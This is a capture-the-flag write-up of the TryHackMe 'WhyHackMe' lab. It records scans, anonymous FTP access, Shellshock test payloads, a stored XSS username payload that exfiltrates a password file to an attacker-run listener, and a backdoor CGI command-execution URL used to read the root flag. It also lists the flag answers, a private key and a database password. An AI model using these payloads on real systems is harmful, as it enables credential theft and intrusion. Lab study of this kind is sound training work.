<h1 align="center">WhyHackMe</h1>
<p align="center">Jun 29, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
part of my 419-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
Dive into the depths of security and analysis with WhyHackMe. <a href="https://tryhackme.com/room/whyhackme"</a>here.<br><br>
<img width="1000px" src="https://github.com/user-attachments/assets/56bba94d-0468-4c3a-9518-90b3a2d98ba4"></p>

<br>

<h2>Task 1 . Exploit!</h2>

<p>A combo of compromising and analysis for security enthusiasts.<br><br>

Please allow the machine 2 - 3 minutes to boot up.</p>

<h3 align="left">Answer the question below</h3>

> 1.1. <em>What is the user flag?</em><br><a id='1.1'></a>
>> <strong><code>1ca4eb201787acbfcf9e70fca87b866a</code></strong><br>

<h3>nmap</h3>

```bash
:~/WhyHackMe# nmap -sC -sV -Pn -p- -T4 TargetIP
...
Host is up (0.00072s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to xx.xx.xxx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome!!
41312/tcp filtered unknown
...
```

<h3>FTP</h3>

```bash
:~/WhyHackMe# ftp TargetIP
Connected to TargetIP.
220 (vsFTPd 3.0.3)
Name (10.10.161.40:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> get update.txt
local: update.txt remote: update.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for update.txt (318 bytes).
226 Transfer complete.
318 bytes received in 0.00 secs (194.9447 kB/s)
ftp> exit
221 Goodbye.
```

<h3>update.txt</h3>

<p>- <code>mike</code> and <code>admin</code><br>
- <code>127.0.0.1/dir/pass.txt</code></p>

```bash
:~/WhyHackMe# cat update.txt
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

<h3>gobuster</h3>

```bash
:~/WhyHackMe# gobuster dir -u http://TargetIP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 100
...
/.php                 (Status: 403) [Size: 277]
/dir                  (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://TargetIP/assets/]
/login.php            (Status: 200) [Size: 523]
/blog.php             (Status: 200) [Size: 3102]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 563]
/register.php         (Status: 200) [Size: 643]
...
/server-status        (Status: 403) [Size: 277]
```

<br>

```bash
:~/WhyHackMe# gobuster dir -u http://TargetIP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
...
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://TargetIP/assets/]
/cgi-bin/             (Status: 403) [Size: 278]
/dir                  (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 563]
/server-status        (Status: 403) [Size: 278]
```


<h3>http://TargetIP</h3>

![image](https://github.com/user-attachments/assets/4b3d9a2b-5441-4d68-b0b1-00b596a836e4)

<h3>http://TargetIP/blog.php</h3>

![image](https://github.com/user-attachments/assets/26b2d943-df5e-4e79-917e-33f953657ac5)

<p>https://hacktricks.boitatech.com.br/pentesting/pentesting-web/cgi</p>

![image](https://github.com/user-attachments/assets/a7f4309c-9515-4881-b65f-306f3153f450)

![image](https://github.com/user-attachments/assets/ac05c986-8a19-425b-a8c8-88b76911bdd3)

<h3>Tested Reflected</h3>

```bash
:~/WhyHackMe# curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://TargetIP/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
```

<h3> Tested Blind with sleep</h3>

```bash
:~/WhyHackMe# curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://TargetIP/cgi-bin/admin.cgi
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at TargetIP Port 80</address>
</body></html>
```

<br>

<p>
    
- registered a username = <code><script>alert(1)</script></code> and a password = <code>pass</code><br>
- logged in login.php<br>
- sent a comment in blog.php</p>

![image](https://github.com/user-attachments/assets/d3e3580b-e326-444e-b403-948ae6060251)

![image](https://github.com/user-attachments/assets/1768b2c3-3d72-4343-b26d-596989f91f90)

<p>
    
- set up an http.server<br>

```bash
:~/WhyHackMe# python3 -m http.server
```

- registered a new user = username <code><script>fetch("http://127.0.0.1/dir/pass.txt").then(response => response.text()).then(data => fetch("http://10.10.174.109:8000/?data=" + encodeURIComponent(data)));</script></code> and password = <code>pass</code><br>
- logged in in login.php<br>
- sent a comment in blog.php</p>

```bash
:~/WhyHackMe# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
TargetIP - - [30/Jun/2025 ...] "GET /?data=jack%3AWhyIsMyPasswordSoStrongIDK%0A HTTP/1.1" 200 -
```

<p>jack : WhyIsMyPasswordSoStrongIDK</p>

```bash
:~/WhyHackMe# ssh jack@TargetIP
...
jack@ubuntu:~$ cat user.txt
1ca4eb201787acbfcf9e70fca87b866a
```

<br>

> 1.2. <em>What is the root flag?</em><br><a id='1.2'></a>
>> <strong><code>4dbe2259ae53846441cc2479b5475c72</code></strong><br>


```bash
jack@ubuntu:~$ sudo -l
[sudo] password for jack: 
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

<p>port 41312</p>

```bash
jack@ubuntu:/home$ sudo /usr/sbin/iptables -L -n --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:41312
...
```

```bash
jack@ubuntu:/opt$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
AttackIP - - [30/Jun/2025 ....] "GET /capture.pcap HTTP/1.1" 200 -
```


```bash
:~/WhyHackMe# wget http://10.10.81.8:8000/capture.pcap
...
```


<p>port 41312</p>

![image](https://github.com/user-attachments/assets/ae1f6bf5-e82c-4abb-a615-77907155c03b)

![image](https://github.com/user-attachments/assets/42e50117-875f-4d47-b9ed-597f318de7de)

<p>TLS</p>

![image](https://github.com/user-attachments/assets/f93c3458-5d5c-4888-86c1-a1a618bb9abf)

![image](https://github.com/user-attachments/assets/6436c704-5407-4ee2-8ae5-e7ce9353a723)

```bash
jack@ubuntu:/etc/apache2/certs$ cat apache.key
-----BEGIN PRIVATE KEY-----
MIIJQgIBADANBgkqhkiG9w0BAQEFAASCCSwwggkoAgEAAoICAQDOkNCaT0sHHS1X
/IjqenvRFL5xjYQz38NZ/uZJYtaYTHHZmzE2mXTU4J1rXlKFVeQ6t3j3BenyxGGI
z/EDQqPoxO7D10PzSw5dvGGUcnYA/hgp5XPUijvtHMcMtqlupI15EMel9Cf0aFMY
U1O2nM0YoRpviZn+3rQ7SOzBr+zvo3pmZHe4BK9EO/rnbjmZgWkEa52wgNvy5Lni
hGt9jx2YtTGJtpEqc+ytb6EapU7LSrwDem05DOc/35NvHO+WX/fboN1+l9WVXwxP
dTBx/z5TykrPKjSSTBwzIVjqSmJS82m6NV1278P7JL/qGIBJcJq+AOZ9S0M9WsWs
LVApqvqwT4gtgGoPH0mfYlkcJqFi/raM8GhFqYthAne1L73ZbGeCelKi0bjp1Ixd
0EE1PHrF+Cvr84cke6RXJWA6SCW1y6Xug3ltJhFSagsINzpIqBj6AfHuGPyG3MNO
b9wIpHBL0duw1nEnJN2WNUfdIqB+41/Ihn/m8fbb3KyR7UbxE9iCto1/iMvi/DfW
HioVKPOlWtrGBXtABjHnVSSzDciMq4EyM+FNqUauwYebONs95FOIdJX6zssXxlze
3ZsyBuCAhy5UEOHCm3Au7NQgjGY+9jx3MXOEMfZiMGUOcTE2e/0+pUV7cLQNQbFP
lWXZ+CB/czyvgthZLKDUa8zXqObzpQIDAQABAoICAAkOLiblnPtl2wwFZRcqYW0s
BKFDu+zuPUkftIa5D4FDsKYCeKjVF1sRsbT4QJPZzRSJ4IKrvrLGyyPNQdqLvFXC
9FifgjoTK0EOthRk5Cls+jAz/9zsZm4hmdRD2a+hBRaulqH+zxWW0TW6yWuy+ga/
YUJMfPTAXJRQwRhIlxF2UDJW6yyk/+301y34FgxVsP3hndsT+xBt2HxGo9OwR3Lf
Vpmb6Ec9J73+q8hYQNkGoLFiV5FtsGGLcpInaZVlBZ+aMLuQ+mr+7LI7B/GnZ9sS
fi8QwZc8QOw45QX4VtEeHJ9uIXfKUQQce1FO26jch9wWfAQ4HW1+IjZHEkGRXkXy
Ow8SatGIXev8fMoGgFc4M/QRQUPOlAevsWPwKD8o6gaggDU1DPiqDb1yBLPFaBGJ
STTjvO1LFtpHgNNKvD9fPVQKLZ7poSxnHuEwt9+yyQWvufVB5eDj8IncZz5FCs52
uctxmyHKzjzTRuytQBk70g9xIVOS8bsVK9nojxAlh3ywyHdykIUEzqrZgTxAGZ+e
/TpSIpeAvKRbM0HZ+ePyEU33p9FYGNvLGLUEuXoUDA2Tla4d/zXxnBVviva4AKhh
vbLzkHpp0JQoIVjgZQUBqICk9yG3uA/dKRG+w4zkkdowvFFsaosiwRlCcOc+Ihj7
/iOngWUOfGKOkIJv8Q0hAoIBAQDsj+dl8xB2fzvxMA/L1Vff/VxLqsnQUnltXQ14
...
tc0d+it0CVQSko3I6qN535x1KzlFkGy8i/P+nvBeCzbccV9fakubxk68OMmgflWA
tBlKzXdlqLoHbWLptdcQhV8pisZrLhd42C+YFb+LY34EQ3MSq/JTPQab73Zxb1qY
8zgwXPatVQA2vA1aN1A1anOcmGZPQg==
-----END PRIVATE KEY-----
jack@ubuntu:/etc/apache2/certs$ 
```

```bash
jack@ubuntu:/var/www/html$ cat config.php
<?php
$servername = "localhost";
$username = "root";
$password = "MysqlPasswordIsPrettyStrong";
$dbname = "commentDB";
?>
jack@ubuntu:/var/www/html$ 
```

![image](https://github.com/user-attachments/assets/cd29fdf1-fb58-49ae-a31a-caff8d11269b)

![image](https://github.com/user-attachments/assets/6840fe3d-3214-4de3-9177-cb8f60ddb742)

![image](https://github.com/user-attachments/assets/46a26209-e0b8-4b6f-ac37-b27205adaf0d)

GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1\r\n

/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id

![image](https://github.com/user-attachments/assets/3fc64eea-7642-4169-845d-74c87782b882)

![image](https://github.com/user-attachments/assets/b97c0e41-e494-44cb-8df7-8ef6fee432c3)

<p>Navigated to https://10.10.110.79:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sudo%20cat%20/root/root.txt</p

![image](https://github.com/user-attachments/assets/bb94c873-cb8e-450f-96ef-0fb9c171476a)


<br>
<br>

![image](https://github.com/user-attachments/assets/9dc063e3-8706-410f-a3f4-3ac4365c3064)

![image](https://github.com/user-attachments/assets/7582f35f-a4b6-4ec5-af9e-fdd6d3373e9d)

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 29, 2025     | 420      |     171ˢᵗ    |      5ᵗʰ     |     220ᵗʰ   |    6ᵗʰ    |  111,909 |    815    |     63    |

</div>

![image](https://github.com/user-attachments/assets/b2cc0cf4-af50-40e0-8417-c27a72956e40)

![image](https://github.com/user-attachments/assets/e209c486-0c62-44b9-9845-6e8e1c2594d9)

![image](https://github.com/user-attachments/assets/974a0b50-d772-4808-8199-1771fef124ae)

![image](https://github.com/user-attachments/assets/4f431974-794b-402f-b9ad-0d31eab6575d)

![image](https://github.com/user-attachments/assets/21d79850-3863-410b-8d17-a5901ac2ad23)

